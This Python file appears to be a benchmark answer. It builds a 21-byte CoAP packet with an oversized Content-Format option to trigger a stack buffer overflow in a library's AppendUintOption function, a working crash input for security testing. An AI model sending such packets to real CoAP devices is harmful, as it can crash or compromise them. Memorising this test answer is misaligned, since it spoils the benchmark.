class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in AppendUintOption.
        
        The vulnerability typically occurs when a CoAP library parses an integer-type option 
        (like Content-Format, Option 12) and copies the option value into a fixed-size 
        stack buffer (e.g., uint64_t or 8 bytes) without verifying that the option length 
        fits in that buffer.
        
        Ground-truth length is 21 bytes.
        Structure:
        - CoAP Header (4 bytes)
        - Option Header (2 bytes for Delta 12, Length 15)
        - Option Value (15 bytes)
        Total: 4 + 2 + 15 = 21 bytes.
        """
        # CoAP Header
        # Ver: 1 (01), Type: CON (00), TKL: 0 (0000) -> 0x40
        # Code: GET (0.01) -> 0x01
        # Message ID: Arbitrary (0x1234)
        header = b'\x40\x01\x12\x34'
        
        # Option: Content-Format (Delta 12)
        # We need a payload length > 8 to overflow a standard integer buffer.
        # To match the 21-byte ground truth: 21 - 4 (header) - 2 (opt overhead) = 15 bytes payload.
        # Length 15 encoding:
        #   Standard length nibble: 13 (indicates 8-bit extended length follows)
        #   Extended length byte: Length - 13 = 15 - 13 = 2
        # Option Byte 1: (Delta=12 << 4) | (Len=13) = 0xC0 | 0x0D = 0xCD
        # Option Byte 2: 0x02
        option_header = b'\xCD\x02'
        
        # Payload: 15 bytes of data
        payload = b'A' * 15
        
        return header + option_header + payload